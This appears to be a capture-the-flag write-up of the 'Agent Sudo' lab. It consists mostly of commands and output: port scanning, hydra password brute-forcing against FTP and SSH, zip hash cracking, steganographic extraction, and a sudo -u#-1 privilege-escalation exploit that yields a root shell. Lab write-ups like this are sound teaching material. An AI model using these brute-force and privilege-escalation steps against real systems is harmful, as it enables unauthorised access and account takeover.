---
title: 'Agent Sudo'
date: 2020-07-28
---

- [Tools & Commands](#tools-&-commands)
- [Task 2 - Enumerate](#task-2---enumerate)
- [3 - Hash cracking and brute-force](#3---hash-cracking-and-brute-force)
- [Task 4 - Capture the user flag](#task-4---capture-the-user-flag)
- [Task 5 - Privilege escalation](#task-5---privilege-escalation)

## Tools & Commands

- nmap
- curl
- hydra
- ftp
- strings
- binwalk
- john
- 7z
- base64
- steghide
- ssh
- scp
- tineye
- sudo

## Task 2 - Enumerate

```bash
$ sudo nmap -sV -O 10.10.221.74 -T4 -v
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
No exact OS matches for host

# firefox user agent spoofing isn't working

$ curl -A "R" -L 10.10.221.74
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
[...]

$ curl -A "C" -L 10.10.221.74
```

## 3 - Hash cracking and brute-force

```bash
$ hydra -l chris -P rockyou7.txt ftp://10.10.221.74 -V
[21][ftp] host: 10.10.221.74   login: chris   password: crystal

$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ssh://10.10.221.74 -V -t4

$ ftp 10.10.221.74
ftp> ls
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png

ftp> get To_agentJ.txt
ftp> get cute-alien.jpg
ftp> get cutie.png

$ cat To_agentJ.txt 

$ strings cutie.png
[...]
To_agentR.txt
[...]

$ strings cute-alien.jpg
# nothing of interest

$ binwalk cutie.png 
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

$ binwalk -e cutie.png
$ cd _cutie.png.extracted/
$ ls
365  365.zlib  8702.zip  To_agentR.txt
$ 7z x 8702.zip 
[...]
Enter password (will not be echoed):
$ sudo zip2john 8702.zip > 8702hash
$ sudo john --format=zip 8702hash
alien            (8702.zip/To_agentR.txt)
$ 7z x 8702.zip 
$ cat To_agentR.txt 

$ base64 -d < QXJlYTUx 
Area51

$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".

$ cat message.txt 
```

## Task 4 - Capture the user flag

```bash
james@agent-sudo:~$ cat user_flag.txt

$ scp james@10.10.221.74:/home/james/Alien_autospy.jpg .

# tineye

```

## Task 5 - Privilege escalation

```bash
james@agent-sudo:~$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

# Google (ALL, !root) /bin/bash
# https://www.exploit-db.com/exploits/47502

james@agent-sudo:~$ sudo -u#-1 /bin/bash

root@agent-sudo:~# cat /root/root.txt 
```